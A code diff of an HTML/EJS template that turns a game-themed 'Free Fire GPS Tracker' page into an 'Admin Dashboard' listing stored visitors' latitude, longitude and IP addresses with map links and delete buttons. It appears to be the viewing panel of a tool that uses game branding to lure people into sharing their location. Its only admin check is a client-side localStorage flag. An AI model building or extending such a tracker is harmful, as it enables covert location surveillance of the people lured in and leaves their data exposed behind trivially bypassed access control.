@@ -1,107 +1,87 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Free Fire GPS Tracker</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard</title>
+<script src="https://cdn.tailwindcss.com"></script>
 
-  <style>
-    /* Background video */
-    #bgVideo {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      object-fit: cover;
-      z-index: -1;
-      filter: brightness(0.4) blur(2px);
-    }
-
-    /* FF glowing card */
-    .ff-card {
-      background: rgba(0, 0, 0, 0.55);
-      border: 2px solid #ff7b00;
-      box-shadow: 0 0 25px #ff7b00aa;
-      backdrop-filter: blur(5px);
-      animation: fadeIn 0.5s ease-out;
-    }
-
-    /* FF glowing button */
-    .ff-btn {
-      background: linear-gradient(90deg, #ff8800, #ff3c00);
-      color: #fff;
-      padding: 14px 28px;
-      border-radius: 10px;
-      font-size: 20px;
-      font-weight: bold;
-      box-shadow: 0 0 30px #ff4d00aa;
-      transition: 0.2s;
-    }
-
-    .ff-btn:hover {
-      transform: scale(1.08);
-      box-shadow: 0 0 40px #ff6a00ff;
-    }
-
-    /* Kill animation (button click) */
-    @keyframes killFlash {
-      0% { box-shadow: 0 0 0px red; }
-      50% { box-shadow: 0 0 35px red; }
-      100% { box-shadow: 0 0 0px red; }
-    }
-
-    .kill-effect {
-      animation: killFlash 0.4s ease-out;
-    }
-
-    /* Fade animation */
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.96); }
-      to { opacity: 1; transform: scale(1); }
-    }
-
-    /* Neon text */
-    .ff-title {
-      text-shadow: 0 0 15px #ff9100, 0 0 25px #ff3c00;
-    }
-  </style>
+<style>
+  body {
+    background: #0b0b0b;
+  }
+</style>
 </head>
 
-<body class="text-white p-6">
+<body class="text-white">
 
-  <!-- 🔥 Background video -->
-  <video autoplay loop muted id="bgVideo">
-    <source src="https://cdn.discordapp.com/attachments/1109310900709501000/1317494920190203904/fire_bg.mp4" type="video/mp4">
-  </video>
+<script>
+if (localStorage.getItem("isAdmin") !== "true") {
+  window.location.href = "/admin";
+}
+function logout() {
+  localStorage.removeItem("isAdmin");
+  window.location.href = "/admin";
+}
+</script>
 
-  <h1 class="text-4xl text-center font-extrabold ff-title mb-8">
-    🔥 FREE FIRE TRACKER 🎯
-  </h1>
+<!-- HEADER -->
+<header class="sticky top-0 bg-black/80 backdrop-blur border-b border-gray-800">
+  <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
+    <h1 class="text-xl sm:text-2xl font-semibold">
+      Admin Dashboard
+    </h1>
 
-  <div class="text-center mb-6">
-    <button onclick="getLocation()" id="saveBtn" class="ff-btn">
-      GET MY LOCATION 💥
+    <button onclick="logout()"
+      class="text-sm text-red-400 hover:text-red-500">
+      Logout
     </button>
   </div>
+</header>
 
-  <p id="msg" class="text-center text-yellow-300 font-bold text-lg mb-4"></p>
+<!-- ACTION BAR -->
+<section class="max-w-7xl mx-auto px-4 py-6">
+  <form method="POST" action="/delete-all" class="flex justify-end">
+    <button
+      class="bg-red-600 hover:bg-red-700 text-white
+             px-4 py-2 rounded-lg text-sm font-medium transition">
+      Delete All
+    </button>
+  </form>
+</section>
 
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+<!-- DATA GRID -->
+<section class="max-w-7xl mx-auto px-4 pb-10">
+  <div class="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
     <% data.forEach(item => { %>
-      <div class="ff-card p-4 rounded-xl">
-        <p><b>Latitude:</b> <%= item.lat %></p>
-        <p><b>Longitude:</b> <%= item.lon %></p>
-        <p><b>IP Address:</b> <%= item.ip %></p>
+      <div class="bg-black/60 border border-gray-800 rounded-xl p-4
+                  hover:border-gray-600 transition">
 
-        <a
-          class="text-cyan-300 underline font-semibold"
-          target="_blank"
-          href="https://www.google.com/maps?q=<%= item.lat %>,<%= item.lon %>">
-          ▶ View On Google Maps
-        </a>
+        <div class="space-y-1 text-sm text-gray-300">
+          <p><span class="text-gray-500">Latitude:</span> <%= item.lat %></p>
+          <p><span class="text-gray-500">Longitude:</span> <%= item.lon %></p>
+          <p><span class="text-gray-500">IP:</span> <%= item.ip %></p>
+        </div>
+
+        <div class="flex justify-between items-center mt-4">
+          <a target="_blank"
+             class="text-blue-400 hover:underline text-sm"
+             href="https://www.google.com/maps?q=<%= item.lat %>,<%= item.lon %>">
+            View Map
+          </a>
+
+          <form method="POST" action="/delete/<%= item._id %>">
+            <button
+              class="text-sm text-red-400 hover:text-red-500">
+              Delete
+            </button>
+          </form>
+        </div>
+
       </div>
     <% }) %>
   </div>
-
-  <%- include("script") %>
+</section>
 
 </body>
 </html>
